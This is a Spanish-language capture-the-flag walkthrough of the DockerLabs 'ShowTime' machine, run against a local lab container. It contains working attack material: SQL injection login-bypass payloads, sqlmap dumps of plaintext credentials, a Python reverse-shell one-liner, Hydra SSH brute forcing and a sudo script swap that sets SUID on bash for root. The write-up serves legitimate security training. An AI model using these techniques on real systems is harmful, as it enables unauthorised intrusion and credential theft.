---
icon: flag
---

# ShowTime DockerLabs (Easy)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip showtime.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh showtime.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-09 11:34 CET
Nmap scan report for 172.17.0.2
Host is up (0.000029s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 e1:9a:9f:b3:17:be:3d:2e:12:05:0f:a4:61:c3:b3:76 (ECDSA)
|_  256 69:8f:5c:4f:14:b0:4d:b6:b7:59:34:4d:b9:03:40:75 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: cs
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.33 seconds
```

Si entramos al puerto `80` veremos una pagina normal, pero si entramos al `login` y probamos a meter credenciales por defecto, veremos que no va a funciona, pero vamos a probar a realizar un `SQL Injection` de forma super basica.

```
User: ' OR 1=1-- -
Pass: ' OR 1=1-- -
```

Y veremos esto:

<figure><img src="../../.gitbook/assets/image (284).png" alt=""><figcaption></figcaption></figure>

Vemos que funciona, por lo que vamos a realizar un `SQL Injection`.

## sqlmap

Vamos a capturar la peticion del login metiendo credenciales normales como `admin:admin` y con `BurpSuite` capturamos la peticion, lo guardamos en un `request.txt` de la siguiente forma:

> request.txt

```
POST /login_page/auth.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Origin: http://172.17.0.2
Connection: keep-alive
Referer: http://172.17.0.2/login_page/auth.php
Cookie: PHPSESSID=ft2h2i22dq64it0rmd342keqj3
Upgrade-Insecure-Requests: 1
Priority: u=0, i

usuario=admin&contrase%C3%B1a=admin
```

```shell
sqlmap -r request.txt --dbs --batch
```

Info:

```
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.11#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assumeno liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:40:59 /2025-03-09/

[11:40:59] [INFO] parsing HTTP request from 'request.txt'
[11:40:59] [INFO] testing connection to the target URL
[11:40:59] [INFO] checking if the target is protected by some kind of WAF/IPS
[11:40:59] [INFO] testing if the target URL content is stable
[11:41:00] [INFO] target URL content is stable
[11:41:00] [INFO] testing if POST parameter 'usuario' is dynamic
[11:41:00] [WARNING] POST parameter 'usuario' does not appear to be dynamic
[11:41:00] [INFO] heuristic (basic) test shows that POST parameter 'usuario' might be injectable (possible DBMS: 'MySQL')
[11:41:00] [INFO] testing for SQL injection on POST parameter 'usuario'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[11:41:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[11:41:00] [WARNING] reflective value(s) found and filtering out
[11:41:00] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[11:41:00] [INFO] testing 'Generic inline queries'
[11:41:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[11:41:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
got a 302 redirect to 'http://172.17.0.2/login_page/home.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N
[11:41:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[11:41:01] [INFO] POST parameter 'usuario' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable (with --string="DE")
[11:41:01] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[11:41:01] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[11:41:01] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[11:41:01] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[11:41:01] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[11:41:01] [INFO] POST parameter 'usuario' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable
[11:41:01] [INFO] testing 'MySQL inline queries'
[11:41:01] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[11:41:01] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[11:41:01] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[11:41:01] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[11:41:01] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[11:41:01] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[11:41:01] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[11:41:11] [INFO] POST parameter 'usuario' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[11:41:11] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[11:41:11] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[11:41:11] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[11:41:11] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[11:41:11] [INFO] target URL appears to have 3 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[11:41:11] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')
[11:41:11] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[11:41:11] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[11:41:11] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[11:41:11] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[11:41:11] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[11:41:12] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[11:41:12] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[11:41:12] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[11:41:12] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[11:41:12] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
POST parameter 'usuario' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 350 HTTP(s) requests:
---
Parameter: usuario (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: usuario=admin' OR NOT 8838=8838#&contrase%C3%B1a=admin

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: usuario=admin' AND GTID_SUBSET(CONCAT(0x7170716b71,(SELECT (ELT(2407=2407,1))),0x7176787171),2407)-- QPsJ&contrase%C3%B1a=admin

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: usuario=admin' AND (SELECT 1600 FROM (SELECT(SLEEP(5)))RZVn)-- bLjg&contrase%C3%B1a=admin
---
[11:41:12] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.6
[11:41:12] [INFO] fetching database names
[11:41:12] [INFO] retrieved: 'mysql'
[11:41:12] [INFO] retrieved: 'information_schema'
[11:41:12] [INFO] retrieved: 'performance_schema'
[11:41:12] [INFO] retrieved: 'sys'
[11:41:12] [INFO] retrieved: 'users'
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] users

[11:41:12] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.17.0.2'

[*] ending @ 11:41:12 /2025-03-09/
```

Vemos que ha funcionado y veremos las bases de datos de `SQL`, por lo que ahora vamos a ver que tablas contiene la base de datos llamada `users`.

```shell
sqlmap -r request.txt --dbs --batch -D users --threads 10 --tables
```

Info:

```
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.8.11#stable}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assumeno liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:42:24 /2025-03-09/

[11:42:24] [INFO] parsing HTTP request from 'request.txt'
[11:42:24] [INFO] resuming back-end DBMS 'mysql'
[11:42:24] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: usuario (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: usuario=admin' OR NOT 8838=8838#&contrase%C3%B1a=admin

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: usuario=admin' AND GTID_SUBSET(CONCAT(0x7170716b71,(SELECT (ELT(2407=2407,1))),0x7176787171),2407)-- QPsJ&contrase%C3%B1a=admin

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: usuario=admin' AND (SELECT 1600 FROM (SELECT(SLEEP(5)))RZVn)-- bLjg&contrase%C3%B1a=admin
---
[11:42:24] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.6
[11:42:24] [INFO] fetching database names
[11:42:24] [INFO] starting 5 threads
[11:42:24] [INFO] resumed: 'sys'
[11:42:24] [INFO] resumed: 'information_schema'
[11:42:24] [INFO] resumed: 'users'
[11:42:24] [INFO] resumed: 'mysql'
[11:42:24] [INFO] resumed: 'performance_schema'
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] users

[11:42:24] [INFO] fetching tables for database: 'users'
[11:42:24] [INFO] retrieved: 'usuarios'
Database: users
[1 table]
+----------+
| usuarios |
+----------+

[11:42:24] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.17.0.2'

[*] ending @ 11:42:24 /2025-03-09/
```

Vemos que solo hay una tabla llamada `usuarios`, ahora vamos a ver que columnas contiene dicha tabla para ver la informacion que contiene.

```shell
sqlmap -r request.txt --dbs --batch -D users -T usuarios --threads 10 --dump
```

Info:

```
       ___
       __H__
 ___ ___[']_____ ___ ___  {1.8.11#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assumeno liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:43:36 /2025-03-09/

[11:43:36] [INFO] parsing HTTP request from 'request.txt'
[11:43:37] [INFO] resuming back-end DBMS 'mysql'
[11:43:37] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: usuario (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: usuario=admin' OR NOT 8838=8838#&contrase%C3%B1a=admin

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: usuario=admin' AND GTID_SUBSET(CONCAT(0x7170716b71,(SELECT (ELT(2407=2407,1))),0x7176787171),2407)-- QPsJ&contrase%C3%B1a=admin

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: usuario=admin' AND (SELECT 1600 FROM (SELECT(SLEEP(5)))RZVn)-- bLjg&contrase%C3%B1a=admin
---
[11:43:37] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.58
back-end DBMS: MySQL >= 5.6
[11:43:37] [INFO] fetching database names
[11:43:37] [INFO] starting 5 threads
[11:43:37] [INFO] resumed: 'mysql'
[11:43:37] [INFO] resumed: 'information_schema'
[11:43:37] [INFO] resumed: 'users'
[11:43:37] [INFO] resumed: 'performance_schema'
[11:43:37] [INFO] resumed: 'sys'
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] users

[11:43:37] [INFO] fetching columns for table 'usuarios' in database 'users'
[11:43:37] [INFO] starting 3 threads
[11:43:37] [INFO] retrieved: 'id'
[11:43:37] [INFO] retrieved: 'username'
[11:43:37] [INFO] retrieved: 'password'
[11:43:37] [INFO] retrieved: 'varchar(50)'
[11:43:37] [INFO] retrieved: 'int unsigned'
[11:43:37] [INFO] retrieved: 'varchar(50)'
[11:43:37] [INFO] fetching entries for table 'usuarios' in database 'users'
[11:43:37] [INFO] starting 3 threads
[11:43:37] [INFO] retrieved: '1'
[11:43:37] [INFO] retrieved: '3'
[11:43:37] [INFO] retrieved: '2'
[11:43:37] [INFO] retrieved: '123321123321'
[11:43:37] [INFO] retrieved: '123456123456'
[11:43:37] [INFO] retrieved: 'MiClaveEsInhackeable'
[11:43:37] [INFO] retrieved: 'lucas'
[11:43:37] [INFO] retrieved: 'santiago'
[11:43:37] [INFO] retrieved: 'joe'
Database: users
Table: usuarios
[3 entries]
+----+----------------------+----------+
| id | password             | username |
+----+----------------------+----------+
| 1  | 123321123321         | lucas    |
| 2  | 123456123456         | santiago |
| 3  | MiClaveEsInhackeable | joe      |
+----+----------------------+----------+

[11:43:37] [INFO] table 'users.usuarios' dumped to CSV file '/root/.local/share/sqlmap/output/172.17.0.2/dump/users/usuarios.csv'
[11:43:37] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.17.0.2'

[*] ending @ 11:43:37 /2025-03-09/
```

Vemos varias credenciales de dicha tabla, por lo que vamos a probarlas por `SSH`, pero no tendremos suerte, pero si por ejemplo utilizamos las siguiente credenciales en la pagina web del login:

```
User: joe
Pass: MiClaveEsInhackeable
```

Veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (283).png" alt=""><figcaption></figcaption></figure>

## Escalate user www-data

Vemos que podemos ejecutar comandos de `python3` por lo que haremos lo siguiente para generarnos una `reverse shell`.

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

Antes de enviarlo nos pondremos al a escucha:

```shell
nc -lvnp <PORT>
```

Ahora le daremos a `Ejecutar Comando` para que envie la `shell`, si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.28] from (UNKNOWN) [172.17.0.2] 44748
$ whoami
whoami
www-data
```

Ahora sanitizaremos la shell.

### Sanitizacion Shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user joe

Si nos vamos a la carpeta `/tmp` veremos lo siguiente:

```shell
cd /tmp
ls -la
```

Info:

```
total 20
drwxrwxrwt 1 root     root     4096 Mar  9 07:54 .
drwxr-xr-x 1 root     root     4096 Mar  9 07:33 ..
-rw-r--r-- 1 root     root      894 Jul 22  2024 .hidden_text.txt
-rw-r--r-- 1 www-data www-data  206 Mar  9 07:54 temp_script.py
drwx------ 2 mysql    mysql    4096 Jul 22  2024 tmp.w3E3JvWoeD
```

Vamos a leer el archivo `.hidden_text.txt` en el cual veremos lo siguiente:

```
Martin, esta es mi lista de mis trucos favoritos de gta sa:


HESOYAM
UZUMYMW
JUMPJET
LXGIWYL
KJKSZPJ
YECGAA
SZCMAWO
ROCKETMAN
AIWPRTON
OLDSPEEDDEMON
CPKTNWT
WORSHIPME
NATURALTALENT
BUFFMEUP
AEZAKMI
BRINGITON
FULLCLIP
CVWKXAM
OUIQDMW
PROFESSIONALSKIT
PROFESSIONALTOOLS
NINJATOWN
STINGLIKEABEE
GHOSTTOWN
BLUESUEDESHOES
SPEEDITUP
SLOWITDOWN
SLOWITDOWNBRO
BAGUVIX
CJPHONEHOME
SPEEDFREAK
BUBBLECARS
KANGAROO
CRAZYTOWN
EVERYONEISRICH
EVERYONEISPOOR
CHITTYCHITTYBANGBANG
FLYINGTOSTUNT
FLYINGFISH
MONSTERMASH
BIFBUZZ
WHEELSONLYPLEASE
SLOWMO
SPECIALK
JUMPJET
FLYINGTOSTUNT
FLYINGFISH
ASNAEB
BTCDBCB
KVGYZQK
HELLOLADIES
BGLUAWML
OSRBLHH
LJSPQK
VKYPQCF
SZCMAWO
ROCKETMAN
AIWPRTON
OLDSPEEDDEMON
CPKTNWT
WORSHIPME
NATURALTALENT
BUFFMEUP
BRINGITON
FULLCLIP
CVWKXAM
OUIQDMW
PROFESSIONALSKIT
PROFESSIONALTOOLS
NINJATOWN
STINGLIKEABEE
GHOSTTOWN
SPEEDITUP
SLOWITDOWN
SLOWITDOWNBRO
BAGUVIX
SPEEDFREAK
BUBBLECARS
```

Vemos que todo esta en mayuscula, por lo que vamos a pasarlo todo a minuscula y tirar un ataque de fuerza bruta por `SSH` con la lista de usuarios que hay en el sistema.

### Hydra

> users.txt

```
joe
santiago
lucas
```

Ejecutamos lo siguiente, para pasarlo a minusculas:

```shell
cat passVictim.txt | tr '[:upper:]' '[:lower:]' > pass.txt
```

> pass.txt

```
hesoyam
uzumymw
jumpjet
lxgiwyl
kjkszpj
yecgaa
szcmawo
rocketman
aiwprton
oldspeeddemon
cpktnwt
worshipme
naturaltalent
buffmeup
aezakmi
bringiton
fullclip
cvwkxam
ouiqdmw
professionalskit
professionaltools
ninjatown
stinglikeabee
ghosttown
bluesuedeshoes
speeditup
slowitdown
slowitdownbro
baguvix
cjphonehome
speedfreak
bubblecars
kangaroo
crazytown
everyoneisrich
everyoneispoor
chittychittybangbang
flyingtostunt
flyingfish
monstermash
bifbuzz
wheelsonlyplease
slowmo
specialk
jumpjet
flyingtostunt
flyingfish
asnaeb
btcdbcb
kvgyzqk
helloladies
bgluawml
osrblhh
ljspqk
vkypqcf
szcmawo
rocketman
aiwprton
oldspeeddemon
cpktnwt
worshipme
naturaltalent
buffmeup
bringiton
fullclip
cvwkxam
ouiqdmw
professionalskit
professionaltools
ninjatown
stinglikeabee
ghosttown
speeditup
slowitdown
slowitdownbro
baguvix
speedfreak
bubblecars
```

```shell
hydra -L users.txt -P pass.txt ssh://<IP> -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-09 12:03:24
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 234 login tries (l:3/p:78), ~4 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: joe   password: chittychittybangbang
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

Vemos que obtuvimos las credenciales del usuario `joe`, por lo que nos conectaremos por `SSH` de la siguiente forma.

### SSH

```shell
ssh joe@<IP>
```

Metemos como contraseña `chittychittybangbang` y veremos que estamos dentro con dicho usuario.

## Escalate user luciano

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for joe on 16a18efc4706:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joe may run the following commands on 16a18efc4706:
    (luciano) NOPASSWD: /bin/posh
```

Vemos que podemos ejecutar el binario `posh` como el usuario `luciano`, por lo que haremos lo siguiente:

```shell
sudo -u luciano posh
```

Info:

```
luciano@16a18efc4706:/home/joe$ whoami
luciano
```

Con esto seremos dicho usuario.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for luciano on 16a18efc4706:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User luciano may run the following commands on 16a18efc4706:
    (root) NOPASSWD: /bin/bash /home/luciano/script.sh
```

Vemos que podemos ejecutar el script `script.sh` como el usuario `root`, pero vemos que esta en nuestra `/home`, por lo que podremos eliminar el script y crear el mismo con el contenido que queramos y ejecutarlo como `root`, haremos lo siguiente:

```shell
rm /home/luciano/script.sh
```

Ahora crearemos el mismo archivo pero con este contenido:

> script.sh

```bash
#!/bin/bash

echo "Permisos SUID establecidos correctamente..."
chmod u+s /bin/bash
```

```shell
echo -e '#!/bin/bash\n\necho "Permisos SUID establecidos correctamente..."\nchmod u+s /bin/bash' > /home/luciano/script.sh
```

Y lo ejecutaremos:

```shell
sudo bash /home/luciano/script.sh
```

Info:

```
Permisos SUID establecidos correctamente...
```

Ahora lo ejecutaremos de la siguiente forma:

```shell
bash -p
```

Info:

```
bash-5.2# whoami
root
```

Con esto veremos que seremos `root` por lo que habremos terminado la maquina.
